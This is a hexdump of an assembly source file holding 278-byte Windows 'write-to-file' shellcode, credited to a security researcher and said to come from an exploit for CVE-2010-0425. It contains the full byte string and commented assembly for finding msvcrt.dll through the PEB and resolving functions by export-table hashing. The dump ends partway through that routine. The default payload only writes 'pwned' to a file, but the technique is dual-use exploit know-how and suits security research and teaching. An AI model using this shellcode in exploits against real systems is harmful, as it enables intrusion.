00000000  3b 20 57 72 69 74 65 2d  74 6f 2d 66 69 6c 65 20  |; Write-to-file |
00000010  53 68 65 6c 6c 63 6f 64  65 0d 0a 3b 0d 0a 3b 20  |Shellcode..;..; |
00000020  54 68 69 73 20 73 68 65  6c 6c 63 6f 64 65 20 77  |This shellcode w|
00000030  61 73 20 75 73 65 64 20  69 6e 20 74 68 65 20 65  |as used in the e|
00000040  78 70 6c 6f 69 74 20 66  6f 72 3a 20 43 56 45 2d  |xploit for: CVE-|
00000050  32 30 31 30 2d 30 34 32  35 0d 0a 3b 20 53 75 70  |2010-0425..; Sup|
00000060  70 6f 72 74 65 64 3a 20  57 69 6e 64 6f 77 73 20  |ported: Windows |
00000070  32 30 30 30 2c 20 57 69  6e 58 50 2c 20 53 65 72  |2000, WinXP, Ser|
00000080  76 65 72 20 32 30 30 33  2c 20 53 65 72 76 65 72  |ver 2003, Server|
00000090  20 32 30 30 38 2c 20 56  69 73 74 61 2c 20 57 69  | 2008, Vista, Wi|
000000a0  6e 64 6f 77 73 20 37 0d  0a 3b 0d 0a 3b 20 53 69  |ndows 7..;..; Si|
000000b0  7a 65 3a 20 32 37 38 20  62 79 74 65 73 0d 0a 3b  |ze: 278 bytes..;|
000000c0  20 2f 2f 2f 2f 2f 2f 2f  2f 2f 2f 2f 2f 2f 2f 2f  | ///////////////|
000000d0  2f 2f 2f 2f 2f 2f 2f 2f  2f 2f 2f 2f 2f 2f 2f 2f  |////////////////|
*
00000110  2f 0d 0a 3b 20 5c 78 33  31 5c 78 63 30 5c 78 33  |/..; \x31\xc0\x3|
00000120  31 5c 78 63 39 5c 78 36  34 5c 78 38 62 5c 78 37  |1\xc9\x64\x8b\x7|
00000130  31 5c 78 33 30 5c 78 38  62 5c 78 37 36 5c 78 30  |1\x30\x8b\x76\x0|
00000140  63 5c 78 38 62 5c 78 37  36 5c 78 31 63 5c 78 38  |c\x8b\x76\x1c\x8|
00000150  62 5c 78 35 36 5c 78 30  38 5c 78 38 62 5c 78 37  |b\x56\x08\x8b\x7|
00000160  65 5c 78 32 30 0d 0a 3b  20 5c 78 38 62 5c 78 33  |e\x20..; \x8b\x3|
00000170  36 5c 78 36 36 5c 78 33  39 5c 78 34 66 5c 78 31  |6\x66\x39\x4f\x1|
00000180  34 5c 78 37 35 5c 78 66  32 5c 78 36 36 5c 78 62  |4\x75\xf2\x66\xb|
00000190  39 5c 78 30 31 5c 78 36  64 5c 78 36 36 5c 78 38  |9\x01\x6d\x66\x8|
000001a0  31 5c 78 65 39 5c 78 39  34 5c 78 36 63 5c 78 36  |1\xe9\x94\x6c\x6|
000001b0  36 5c 78 33 39 5c 78 30  66 0d 0a 3b 20 5c 78 36  |6\x39\x0f..; \x6|
000001c0  36 5c 78 38 39 5c 78 63  31 5c 78 37 35 5c 78 65  |6\x89\xc1\x75\xe|
000001d0  31 5c 78 38 39 5c 78 65  35 5c 78 65 62 5c 78 37  |1\x89\xe5\xeb\x7|
000001e0  31 5c 78 36 30 5c 78 38  62 5c 78 36 63 5c 78 32  |1\x60\x8b\x6c\x2|
000001f0  34 5c 78 32 34 5c 78 38  62 5c 78 34 35 5c 78 33  |4\x24\x8b\x45\x3|
00000200  63 5c 78 38 62 5c 78 35  34 5c 78 30 35 0d 0a 3b  |c\x8b\x54\x05..;|
00000210  20 5c 78 37 38 5c 78 30  31 5c 78 65 61 5c 78 38  | \x78\x01\xea\x8|
00000220  62 5c 78 34 61 5c 78 31  38 5c 78 38 62 5c 78 35  |b\x4a\x18\x8b\x5|
00000230  61 5c 78 32 30 5c 78 30  31 5c 78 65 62 5c 78 65  |a\x20\x01\xeb\xe|
00000240  33 5c 78 33 34 5c 78 34  39 5c 78 38 62 5c 78 33  |3\x34\x49\x8b\x3|
00000250  34 5c 78 38 62 5c 78 30  31 5c 78 65 65 5c 78 33  |4\x8b\x01\xee\x3|
00000260  31 0d 0a 3b 20 5c 78 66  66 5c 78 33 31 5c 78 63  |1..; \xff\x31\xc|
00000270  30 5c 78 66 63 5c 78 61  63 5c 78 38 34 5c 78 63  |0\xfc\xac\x84\xc|
00000280  30 5c 78 37 34 5c 78 30  37 5c 78 63 31 5c 78 63  |0\x74\x07\xc1\xc|
00000290  66 5c 78 30 64 5c 78 30  31 5c 78 63 37 5c 78 65  |f\x0d\x01\xc7\xe|
000002a0  62 5c 78 66 34 5c 78 33  62 5c 78 37 63 5c 78 32  |b\xf4\x3b\x7c\x2|
000002b0  34 5c 78 32 38 0d 0a 3b  20 5c 78 37 35 5c 78 65  |4\x28..; \x75\xe|
000002c0  31 5c 78 38 62 5c 78 35  61 5c 78 32 34 5c 78 30  |1\x8b\x5a\x24\x0|
000002d0  31 5c 78 65 62 5c 78 36  36 5c 78 38 62 5c 78 30  |1\xeb\x66\x8b\x0|
000002e0  63 5c 78 34 62 5c 78 38  62 5c 78 35 61 5c 78 31  |c\x4b\x8b\x5a\x1|
000002f0  63 5c 78 30 31 5c 78 65  62 5c 78 38 62 5c 78 30  |c\x01\xeb\x8b\x0|
00000300  34 5c 78 38 62 5c 78 30  31 0d 0a 3b 20 5c 78 65  |4\x8b\x01..; \xe|
00000310  38 5c 78 38 39 5c 78 34  34 5c 78 32 34 5c 78 31  |8\x89\x44\x24\x1|
00000320  63 5c 78 36 31 5c 78 63  33 5c 78 61 64 5c 78 35  |c\x61\xc3\xad\x5|
00000330  30 5c 78 35 32 5c 78 65  38 5c 78 61 61 5c 78 66  |0\x52\xe8\xaa\xf|
00000340  66 5c 78 66 66 5c 78 66  66 5c 78 38 39 5c 78 30  |f\xff\xff\x89\x0|
00000350  37 5c 78 36 36 5c 78 38  31 5c 78 63 34 0d 0a 3b  |7\x66\x81\xc4..;|
00000360  20 5c 78 30 63 5c 78 30  31 5c 78 36 36 5c 78 38  | \x0c\x01\x66\x8|
00000370  31 5c 78 65 63 5c 78 30  34 5c 78 30 31 5c 78 36  |1\xec\x04\x01\x6|
00000380  36 5c 78 38 31 5c 78 63  37 5c 78 30 38 5c 78 30  |6\x81\xc7\x08\x0|
00000390  31 5c 78 36 36 5c 78 38  31 5c 78 65 66 5c 78 30  |1\x66\x81\xef\x0|
000003a0  34 5c 78 30 31 5c 78 33  39 5c 78 63 65 5c 78 37  |4\x01\x39\xce\x7|
000003b0  35 0d 0a 3b 20 5c 78 64  65 5c 78 63 33 5c 78 65  |5..; \xde\xc3\xe|
000003c0  62 5c 78 31 30 5c 78 35  65 5c 78 38 64 5c 78 37  |b\x10\x5e\x8d\x7|
000003d0  64 5c 78 30 34 5c 78 38  39 5c 78 66 31 5c 78 38  |d\x04\x89\xf1\x8|
000003e0  30 5c 78 63 31 5c 78 30  63 5c 78 65 38 5c 78 63  |0\xc1\x0c\xe8\xc|
000003f0  64 5c 78 66 66 5c 78 66  66 5c 78 66 66 5c 78 65  |d\xff\xff\xff\xe|
00000400  62 5c 78 33 62 0d 0a 3b  20 5c 78 65 38 5c 78 65  |b\x3b..; \xe8\xe|
00000410  62 5c 78 66 66 5c 78 66  66 5c 78 66 66 5c 78 36  |b\xff\xff\xff\x6|
00000420  65 5c 78 37 63 5c 78 32  65 5c 78 65 31 5c 78 31  |e\x7c\x2e\xe1\x1|
00000430  65 5c 78 33 63 5c 78 33  66 5c 78 64 37 5c 78 37  |e\x3c\x3f\xd7\x7|
00000440  34 5c 78 31 65 5c 78 34  38 5c 78 63 64 5c 78 33  |4\x1e\x48\xcd\x3|
00000450  31 5c 78 64 32 5c 78 35  38 0d 0a 3b 20 5c 78 38  |1\xd2\x58..; \x8|
00000460  38 5c 78 35 30 5c 78 30  35 5c 78 65 62 5c 78 32  |8\x50\x05\xeb\x2|
00000470  64 5c 78 33 31 5c 78 64  32 5c 78 35 39 5c 78 38  |d\x31\xd2\x59\x8|
00000480  38 5c 78 35 31 5c 78 30  31 5c 78 65 62 5c 78 32  |8\x51\x01\xeb\x2|
00000490  63 5c 78 35 31 5c 78 35  30 5c 78 66 66 5c 78 35  |c\x51\x50\xff\x5|
000004a0  35 5c 78 30 34 5c 78 65  62 5c 78 32 61 0d 0a 3b  |5\x04\xeb\x2a..;|
000004b0  20 5c 78 33 31 5c 78 64  32 5c 78 35 39 5c 78 38  | \x31\xd2\x59\x8|
000004c0  38 5c 78 35 31 5c 78 30  35 5c 78 65 62 5c 78 32  |8\x51\x05\xeb\x2|
000004d0  64 5c 78 35 31 5c 78 35  30 5c 78 38 39 5c 78 63  |d\x51\x50\x89\xc|
000004e0  36 5c 78 66 66 5c 78 35  35 5c 78 30 38 5c 78 35  |6\xff\x55\x08\x5|
000004f0  33 5c 78 66 66 5c 78 35  35 5c 78 30 63 5c 78 65  |3\xff\x55\x0c\xe|
00000500  38 0d 0a 3b 20 5c 78 64  31 5c 78 66 66 5c 78 66  |8..; \xd1\xff\xf|
00000510  66 5c 78 66 66 5c 78 36  36 5c 78 32 65 5c 78 37  |f\xff\x66\x2e\x7|
00000520  34 5c 78 37 38 5c 78 37  34 5c 78 34 65 5c 78 65  |4\x78\x74\x4e\xe|
00000530  38 5c 78 63 65 5c 78 66  66 5c 78 66 66 5c 78 66  |8\xce\xff\xff\xf|
00000540  66 5c 78 37 37 5c 78 34  65 5c 78 65 38 5c 78 63  |f\x77\x4e\xe8\xc|
00000550  66 5c 78 66 66 0d 0a 3b  20 5c 78 66 66 5c 78 66  |f\xff..; \xff\xf|
00000560  66 5c 78 65 38 5c 78 64  31 5c 78 66 66 5c 78 66  |f\xe8\xd1\xff\xf|
00000570  66 5c 78 66 66 5c 78 37  30 5c 78 37 37 5c 78 36  |f\xff\x70\x77\x6|
00000580  65 5c 78 36 35 5c 78 36  34 5c 78 34 65 5c 78 65  |e\x65\x64\x4e\xe|
00000590  38 5c 78 63 65 5c 78 66  66 5c 78 66 66 5c 78 66  |8\xce\xff\xff\xf|
000005a0  66 0d 0a 3b 20 2f 2f 2f  2f 2f 2f 2f 2f 2f 2f 2f  |f..; ///////////|
000005b0  2f 2f 2f 2f 2f 2f 2f 2f  2f 2f 2f 2f 2f 2f 2f 2f  |////////////////|
*
000005f0  2f 2f 2f 2f 2f 0d 0a 3b  0d 0a 3b 20 4f 72 69 67  |/////..;..; Orig|
00000600  69 6e 3a 20 68 74 74 70  3a 2f 2f 77 77 77 2e 73  |in: http://www.s|
00000610  65 6e 73 65 6f 66 73 65  63 75 72 69 74 79 2e 63  |enseofsecurity.c|
00000620  6f 6d 2e 61 75 0d 0a 3b  20 57 72 69 74 74 65 6e  |om.au..; Written|
00000630  20 62 79 20 42 72 65 74  74 20 47 65 72 76 61 73  | by Brett Gervas|
00000640  6f 6e 69 20 28 62 72 65  74 74 67 20 5b 61 74 5d  |oni (brettg [at]|
00000650  20 73 65 6e 73 65 6f 66  73 65 63 75 72 69 74 79  | senseofsecurity|
00000660  2e 63 6f 6d 2e 61 75 29  0d 0a 3b 0d 0a 3b 20 42  |.com.au)..;..; B|
00000670  79 20 64 65 66 61 75 6c  74 20 74 68 65 20 73 68  |y default the sh|
00000680  65 6c 6c 63 6f 64 65 20  77 69 6c 6c 20 77 72 69  |ellcode will wri|
00000690  74 65 20 22 70 77 6e 65  64 22 20 74 6f 20 61 20  |te "pwned" to a |
000006a0  74 65 78 74 20 66 69 6c  65 20 74 69 74 6c 65 64  |text file titled|
000006b0  20 22 66 2e 74 78 74 22  20 69 6e 0d 0a 3b 20 74  | "f.txt" in..; t|
000006c0  68 65 20 63 75 72 72 65  6e 74 20 77 6f 72 6b 69  |he current worki|
000006d0  6e 67 20 64 69 72 65 63  74 6f 72 79 2e 0d 0a 3b  |ng directory...;|
000006e0  0d 0a 3b 20 45 64 69 74  61 62 6c 65 20 70 61 72  |..; Editable par|
000006f0  61 6d 65 74 65 72 73 3a  0d 0a 3b 20 4c 69 6e 65  |ameters:..; Line|
00000700  20 32 32 38 3a 20 46 69  6c 65 6e 61 6d 65 0d 0a  | 228: Filename..|
00000710  3b 20 20 20 20 20 20 20  20 20 20 20 42 65 20 73  |;           Be s|
00000720  75 72 65 20 74 6f 20 75  70 64 61 74 65 20 74 68  |ure to update th|
00000730  65 20 6c 65 6e 67 74 68  20 6f 6e 20 6c 69 6e 65  |e length on line|
00000740  20 31 38 35 0d 0a 3b 20  4c 69 6e 65 20 32 33 32  | 185..; Line 232|
00000750  3a 20 41 63 63 65 73 73  20 6d 6f 64 65 0d 0a 3b  |: Access mode..;|
00000760  20 20 20 20 20 20 20 20  20 20 20 42 65 20 73 75  |           Be su|
00000770  72 65 20 74 6f 20 75 70  64 61 74 65 20 74 68 65  |re to update the|
00000780  20 6c 65 6e 67 74 68 20  6f 6e 20 6c 69 6e 65 20  | length on line |
00000790  31 39 33 0d 0a 3b 20 4c  69 6e 65 20 32 33 39 3a  |193..; Line 239:|
000007a0  20 44 61 74 61 20 28 74  65 78 74 20 74 6f 20 62  | Data (text to b|
000007b0  65 20 77 72 69 74 74 65  6e 29 0d 0a 3b 20 20 20  |e written)..;   |
000007c0  20 20 20 20 20 20 20 20  42 65 20 73 75 72 65 20  |        Be sure |
000007d0  74 6f 20 75 70 64 61 74  65 20 74 68 65 20 6c 65  |to update the le|
000007e0  6e 67 74 68 20 6f 6e 20  6c 69 6e 65 20 32 30 38  |ngth on line 208|
000007f0  0d 0a 20 0d 0a 5b 53 45  43 54 49 4f 4e 20 2e 74  |.. ..[SECTION .t|
00000800  65 78 74 5d 0d 0a 67 6c  6f 62 61 6c 20 5f 73 74  |ext]..global _st|
00000810  61 72 74 0d 0a 20 0d 0a  5f 73 74 61 72 74 3a 0d  |art.. .._start:.|
00000820  0a 20 20 20 20 3b 20 69  66 20 69 74 20 6d 61 74  |.    ; if it mat|
00000830  74 65 72 73 20 77 68 61  74 20 69 73 20 6f 6e 20  |ters what is on |
00000840  74 68 65 20 73 74 61 63  6b 2c 20 74 68 65 6e 20  |the stack, then |
00000850  61 6c 6c 6f 63 61 74 65  20 73 70 61 63 65 20 2d  |allocate space -|
00000860  20 6f 74 68 65 72 77 69  73 65 2c 20 77 68 6f 20  | otherwise, who |
00000870  63 61 72 65 73 20 77 65  20 61 72 65 20 65 78 69  |cares we are exi|
00000880  74 69 6e 67 20 61 6e 79  77 61 79 3f 0d 0a 20 20  |ting anyway?..  |
00000890  20 20 3b 20 73 61 76 65  20 62 79 74 65 73 20 62  |  ; save bytes b|
000008a0  79 20 6e 6f 74 20 69 6e  63 6c 75 64 69 6e 67 20  |y not including |
000008b0  69 74 2e 2e 2e 0d 0a 20  20 20 20 3b 73 75 62 20  |it.....    ;sub |
000008c0  65 73 70 2c 20 30 78 30  63 20 3b 20 61 6c 6c 6f  |esp, 0x0c ; allo|
000008d0  63 61 74 65 20 73 70 61  63 65 20 6f 6e 20 74 68  |cate space on th|
000008e0  65 20 73 74 61 63 6b 20  66 6f 72 20 66 75 6e 63  |e stack for func|
000008f0  74 20 61 64 64 72 65 73  73 65 73 0d 0a 20 20 20  |t addresses..   |
00000900  20 20 0d 0a 3b 20 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |  ..; ==========|
00000910  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 20 46 69  |============= Fi|
00000920  6e 64 20 74 68 65 20 62  61 73 65 20 61 64 64 72  |nd the base addr|
00000930  65 73 73 20 6f 66 20 6d  73 76 63 72 74 2e 64 6c  |ess of msvcrt.dl|
00000940  6c 20 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |l ==============|
00000950  3d 3d 3d 3d 3d 3d 3d 3d  3d 0d 0a 20 20 20 20 3b  |=========..    ;|
00000960  20 42 79 20 63 68 65 63  6b 69 6e 67 20 69 66 20  | By checking if |
00000970  61 20 65 6e 74 72 79 20  69 6e 20 74 68 65 20 49  |a entry in the I|
00000980  6e 49 6e 69 74 69 61 6c  69 7a 61 74 69 6f 6e 4f  |nInitializationO|
00000990  72 64 65 72 20 6c 69 73  74 20 68 61 73 20 61 20  |rder list has a |
000009a0  6e 75 6c 6c 20 62 79 74  65 20 69 6e 20 70 6f 73  |null byte in pos|
000009b0  69 74 69 6f 6e 0d 0a 20  20 20 20 3b 20 32 30 20  |ition..    ; 20 |
000009c0  77 65 20 63 61 6e 20 66  69 6e 64 20 74 68 65 20  |we can find the |
000009d0  62 61 73 65 20 61 64 64  72 20 6f 66 20 6d 73 76  |base addr of msv|
000009e0  63 72 74 2e 64 6c 6c 20  6f 6e 20 57 69 6e 64 6f  |crt.dll on Windo|
000009f0  77 73 20 37 20 61 6e 64  20 56 69 73 74 61 2e 0d  |ws 7 and Vista..|
00000a00  0a 20 20 20 20 3b 20 22  6d 73 76 63 72 74 2e 64  |.    ; "msvcrt.d|
00000a10  6c 6c 22 20 69 73 20 65  71 75 61 6c 20 74 6f 20  |ll" is equal to |
00000a20  31 30 20 62 79 74 65 73  2c 20 73 6f 20 69 6e 20  |10 bytes, so in |
00000a30  75 6e 69 63 6f 64 65 2c  20 69 74 73 20 32 30 20  |unicode, its 20 |
00000a40  62 79 74 65 73 20 6c 6f  6e 67 2e 0d 0a 20 20 20  |bytes long...   |
00000a50  20 3b 20 6b 65 72 6e 65  6c 33 32 2e 64 6c 6c 20  | ; kernel32.dll |
00000a60  63 61 6e 20 62 65 20 66  6f 75 6e 64 20 69 6e 20  |can be found in |
00000a70  61 20 73 69 6d 69 6c 61  72 20 66 61 73 68 69 6f  |a similar fashio|
00000a80  6e 2e 20 22 6b 65 72 6e  65 6c 33 32 2e 64 6c 6c  |n. "kernel32.dll|
00000a90  22 20 69 73 20 31 32 20  62 79 74 65 73 20 6c 6f  |" is 12 bytes lo|
00000aa0  6e 67 20 74 68 6f 75 67  68 2e 0d 0a 20 20 20 20  |ng though...    |
00000ab0  3b 20 6f 6e 20 57 69 6e  58 50 20 74 68 65 20 49  |; on WinXP the I|
00000ac0  6e 49 6e 69 74 69 61 6c  69 7a 61 74 69 6f 6e 4f  |nInitializationO|
00000ad0  72 64 65 72 20 6c 69 73  74 20 69 73 20 61 73 20  |rder list is as |
00000ae0  66 6f 6c 6c 6f 77 73 3a  20 6e 74 64 6c 6c 2e 64  |follows: ntdll.d|
00000af0  6c 6c 2c 20 6b 65 72 6e  65 6c 33 32 2e 64 6c 6c  |ll, kernel32.dll|
00000b00  2c 20 6d 73 76 63 72 74  2e 64 6c 6c 0d 0a 20 20  |, msvcrt.dll..  |
00000b10  20 20 3b 20 4f 6e 20 57  69 6e 64 6f 77 73 20 53  |  ; On Windows S|
00000b20  65 72 76 65 72 20 32 30  30 33 2c 20 6d 73 76 63  |erver 2003, msvc|
00000b30  72 74 2e 64 6c 6c 20 69  73 20 69 6e 20 70 6f 73  |rt.dll is in pos|
00000b40  69 74 69 6f 6e 20 35 20  61 6e 64 20 62 65 66 6f  |ition 5 and befo|
00000b50  72 65 20 74 68 69 73 20  64 6c 6c 20 69 73 20 63  |re this dll is c|
00000b60  68 65 63 6b 65 64 2c 20  52 50 43 52 54 34 2e 64  |hecked, RPCRT4.d|
00000b70  6c 6c 0d 0a 20 20 20 20  3b 20 69 73 20 63 68 65  |ll..    ; is che|
00000b80  63 6b 65 64 2e 20 57 68  69 63 68 20 6d 61 74 63  |cked. Which matc|
00000b90  68 65 73 20 74 68 65 20  6c 65 6e 67 74 68 20 6f  |hes the length o|
00000ba0  66 20 6d 73 76 63 72 74  2e 64 6c 6c 2c 20 61 73  |f msvcrt.dll, as|
00000bb0  20 61 20 72 65 73 75 6c  74 20 74 68 65 20 62 61  | a result the ba|
00000bc0  73 65 20 61 64 64 72 65  73 73 20 6f 66 20 52 50  |se address of RP|
00000bd0  43 52 54 34 2e 64 6c 6c  0d 0a 20 20 20 20 3b 20  |CRT4.dll..    ; |
00000be0  69 73 20 75 73 65 64 2e  20 4f 62 76 69 6f 75 73  |is used. Obvious|
00000bf0  6c 79 20 74 68 69 73 20  69 73 20 6e 6f 20 67 6f  |ly this is no go|
00000c00  6f 64 2e 20 54 6f 20 73  6f 6c 76 65 20 74 68 69  |od. To solve thi|
00000c10  73 20 70 72 6f 62 6c 65  6d 20 69 20 6d 61 64 65  |s problem i made|
00000c20  20 74 68 65 20 73 68 65  6c 6c 63 6f 64 65 20 63  | the shellcode c|
00000c30  68 65 63 6b 20 66 6f 72  20 74 68 65 0d 0a 20 20  |heck for the..  |
00000c40  20 20 3b 20 70 72 65 73  65 6e 74 73 20 6f 66 20  |  ; presents of |
00000c50  27 6d 27 20 69 6e 20 70  6f 73 69 74 69 6f 6e 20  |'m' in position |
00000c60  30 20 61 73 20 77 65 6c  6c 20 2e 0d 0a 20 20 20  |0 as well ...   |
00000c70  20 78 6f 72 20 65 61 78  2c 20 65 61 78 20 20 20  | xor eax, eax   |
00000c80  20 20 20 20 20 20 20 20  3b 20 6d 61 6b 65 20 73  |        ; make s|
00000c90  75 72 65 20 69 74 20 69  73 20 30 0d 0a 20 20 20  |ure it is 0..   |
00000ca0  20 78 6f 72 20 65 63 78  2c 20 65 63 78 20 20 20  | xor ecx, ecx   |
00000cb0  20 20 20 20 20 20 20 20  3b 20 45 43 58 20 3d 20  |        ; ECX = |
00000cc0  30 0d 0a 20 20 20 20 6d  6f 76 20 65 73 69 2c 20  |0..    mov esi, |
00000cd0  5b 66 73 3a 65 63 78 2b  30 78 33 30 5d 20 3b 20  |[fs:ecx+0x30] ; |
00000ce0  45 53 49 20 3d 20 26 28  50 45 42 29 20 28 5b 46  |ESI = &(PEB) ([F|
00000cf0  53 3a 30 78 33 30 5d 29  0d 0a 20 20 20 20 6d 6f  |S:0x30])..    mo|
00000d00  76 20 65 73 69 2c 20 5b  65 73 69 2b 30 78 30 63  |v esi, [esi+0x0c|
00000d10  5d 20 20 20 20 3b 20 45  53 49 20 3d 20 50 45 42  |]    ; ESI = PEB|
00000d20  2d 3e 4c 64 72 0d 0a 20  20 20 20 6d 6f 76 20 65  |->Ldr..    mov e|
00000d30  73 69 2c 20 5b 65 73 69  2b 30 78 31 63 5d 20 20  |si, [esi+0x1c]  |
00000d40  20 20 3b 20 45 53 49 20  3d 20 50 45 42 2d 3e 4c  |  ; ESI = PEB->L|
00000d50  64 72 2e 49 6e 49 6e 69  74 4f 72 64 65 72 0d 0a  |dr.InInitOrder..|
00000d60  4e 65 78 74 4d 6f 64 75  6c 65 3a 0d 0a 20 20 20  |NextModule:..   |
00000d70  20 6d 6f 76 20 65 64 78  2c 20 5b 65 73 69 2b 30  | mov edx, [esi+0|
00000d80  78 30 38 5d 20 20 20 20  3b 20 45 44 58 20 3d 20  |x08]    ; EDX = |
00000d90  49 6e 49 6e 69 74 4f 72  64 65 72 5b 58 5d 2e 62  |InInitOrder[X].b|
00000da0  61 73 65 5f 61 64 64 72  65 73 73 0d 0a 20 20 20  |ase_address..   |
00000db0  20 6d 6f 76 20 65 64 69  2c 20 5b 65 73 69 2b 30  | mov edi, [esi+0|
00000dc0  78 32 30 5d 20 20 20 20  3b 20 45 44 58 20 3d 20  |x20]    ; EDX = |
00000dd0  49 6e 49 6e 69 74 4f 72  64 65 72 5b 58 5d 2e 6d  |InInitOrder[X].m|
00000de0  6f 64 75 6c 65 5f 6e 61  6d 65 20 28 75 6e 69 63  |odule_name (unic|
00000df0  6f 64 65 29 0d 0a 20 20  20 20 6d 6f 76 20 65 73  |ode)..    mov es|
00000e00  69 2c 20 5b 65 73 69 5d  20 20 20 20 20 20 20 20  |i, [esi]        |
00000e10  20 3b 20 45 53 49 20 3d  20 49 6e 49 6e 69 74 4f  | ; ESI = InInitO|
00000e20  72 64 65 72 5b 58 5d 2e  66 6c 69 6e 6b 20 28 6e  |rder[X].flink (n|
00000e30  65 78 74 20 6d 6f 64 75  6c 65 29 0d 0a 20 20 20  |ext module)..   |
00000e40  20 63 6d 70 20 5b 65 64  69 2b 31 30 2a 32 5d 2c  | cmp [edi+10*2],|
00000e50  20 63 78 20 20 20 20 20  3b 20 6d 6f 64 75 6c 65  | cx     ; module|
00000e60  6e 61 6d 65 5b 31 32 5d  20 3d 3d 20 30 20 3f 0d  |name[12] == 0 ?.|
00000e70  0a 20 20 20 20 6a 6e 65  20 4e 65 78 74 4d 6f 64  |.    jne NextMod|
00000e80  75 6c 65 20 20 20 20 20  20 20 20 20 3b 20 4e 6f  |ule         ; No|
00000e90  3a 20 74 72 79 20 6e 65  78 74 20 6d 6f 64 75 6c  |: try next modul|
00000ea0  65 2e 0d 0a 20 20 20 20  20 0d 0a 20 20 20 20 3b  |e...     ..    ;|
00000eb0  20 65 78 74 72 61 20 63  68 65 63 6b 20 74 6f 20  | extra check to |
00000ec0  66 69 6e 64 20 6d 73 76  63 72 74 2e 64 6c 6c 0d  |find msvcrt.dll.|
00000ed0  0a 20 20 20 20 6d 6f 76  20 63 78 2c 20 30 78 36  |.    mov cx, 0x6|
00000ee0  64 30 31 20 20 20 20 20  20 20 20 20 3b 20 6d 20  |d01         ; m |
00000ef0  3d 20 30 78 36 64 0d 0a  20 20 20 20 73 75 62 20  |= 0x6d..    sub |
00000f00  63 78 2c 20 30 78 36 63  39 34 0d 0a 20 20 20 20  |cx, 0x6c94..    |
00000f10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000f20  20 20 20 20 20 20 20 3b  20 72 65 73 75 6c 74 20  |       ; result |
00000f30  69 73 20 30 78 36 64 20  28 6d 29 0d 0a 20 20 20  |is 0x6d (m)..   |
00000f40  20 63 6d 70 20 5b 65 64  69 5d 2c 20 63 78 20 20  | cmp [edi], cx  |
00000f50  20 20 20 20 20 20 20 20  3b 20 6d 6f 64 75 6c 65  |        ; module|
00000f60  6e 61 6d 65 5b 30 5d 20  3d 3d 20 6d 20 3f 0d 0a  |name[0] == m ?..|
00000f70  20 20 20 20 6d 6f 76 20  63 78 2c 20 61 78 0d 0a  |    mov cx, ax..|
00000f80  20 20 20 20 6a 6e 65 20  4e 65 78 74 4d 6f 64 75  |    jne NextModu|
00000f90  6c 65 0d 0a 20 0d 0a 20  20 20 20 3b 20 62 61 73  |le.. ..    ; bas|
00000fa0  65 20 61 64 64 72 65 73  73 20 6f 66 20 6d 73 76  |e address of msv|
00000fb0  63 72 74 2e 64 6c 6c 20  69 73 20 6e 6f 77 20 69  |crt.dll is now i|
00000fc0  6e 20 65 64 78 0d 0a 20  20 20 20 3b 20 75 70 64  |n edx..    ; upd|
00000fd0  61 74 65 20 65 62 70 0d  0a 20 20 20 20 6d 6f 76  |ate ebp..    mov|
00000fe0  20 65 62 70 2c 20 65 73  70 0d 0a 20 0d 0a 20 20  | ebp, esp.. ..  |
00000ff0  20 20 6a 6d 70 20 73 68  6f 72 74 20 47 65 74 48  |  jmp short GetH|
00001000  61 73 68 65 73 53 70 72  69 6e 67 20 3b 20 75 73  |ashesSpring ; us|
00001010  69 6e 67 20 61 20 73 70  72 69 6e 67 20 74 6f 20  |ing a spring to |
00001020  61 76 6f 69 64 20 6e 75  6c 6c 20 62 79 74 65 73  |avoid null bytes|
00001030  0d 0a 20 0d 0a 3b 20 3d  3d 3d 3d 3d 3d 3d 3d 3d  |.. ..; =========|
00001040  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 20 46  |============== F|
00001050  55 4e 43 54 49 4f 4e 53  20 3d 3d 3d 3d 3d 3d 3d  |UNCTIONS =======|
00001060  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
00001070  0d 0a 3b 20 45 78 70 6f  72 74 20 44 69 72 65 63  |..; Export Direc|
00001080  74 6f 72 79 20 54 61 62  6c 65 20 6d 65 74 68 6f  |tory Table metho|
00001090  64 0d 0a 66 69 6e 64 5f  66 75 6e 63 74 69 6f 6e  |d..find_function|
000010a0  3a 0d 0a 20 20 20 20 70  75 73 68 61 64 0d 0a 20  |:..    pushad.. |
000010b0  20 20 20 6d 6f 76 20 65  62 70 2c 20 5b 65 73 70  |   mov ebp, [esp|
000010c0  20 2b 20 30 78 32 34 5d  0d 0a 20 20 20 20 6d 6f  | + 0x24]..    mo|
000010d0  76 20 65 61 78 2c 20 5b  65 62 70 20 2b 20 30 78  |v eax, [ebp + 0x|
000010e0  33 63 5d 0d 0a 20 20 20  20 6d 6f 76 20 65 64 78  |3c]..    mov edx|
000010f0  2c 20 5b 65 62 70 20 2b  20 65 61 78 20 2b 20 30  |, [ebp + eax + 0|
00001100  78 37 38 5d 0d 0a 20 20  20 20 61 64 64 20 65 64  |x78]..    add ed|
00001110  78 2c 20 65 62 70 0d 0a  20 20 20 20 6d 6f 76 20  |x, ebp..    mov |
00001120  65 63 78 2c 20 5b 65 64  78 20 2b 20 30 78 31 38  |ecx, [edx + 0x18|
00001130  5d 0d 0a 20 20 20 20 6d  6f 76 20 65 62 78 2c 20  |]..    mov ebx, |
00001140  5b 65 64 78 20 2b 20 30  78 32 30 5d 0d 0a 20 20  |[edx + 0x20]..  |
00001150  20 20 61 64 64 20 65 62  78 2c 20 65 62 70 0d 0a  |  add ebx, ebp..|
00001160  66 69 6e 64 5f 66 75 6e  63 74 69 6f 6e 5f 6c 6f  |find_function_lo|
00001170  6f 70 3a 0d 0a 20 20 20  20 6a 65 63 78 7a 20 66  |op:..    jecxz f|
00001180  69 6e 64 5f 66 75 6e 63  74 69 6f 6e 5f 66 69 6e  |ind_function_fin|
00001190  69 73 68 65 64 0d 0a 20  20 20 20 64 65 63 20 65  |ished..    dec e|
000011a0  63 78 0d 0a 20 20 20 20  6d 6f 76 20 65 73 69 2c  |cx..    mov esi,|
000011b0  20 5b 65 62 78 20 2b 20  65 63 78 20 2a 20 34 5d  | [ebx + ecx * 4]|
000011c0  0d 0a 20 20 20 20 61 64  64 20 65 73 69 2c 20 65  |..    add esi, e|
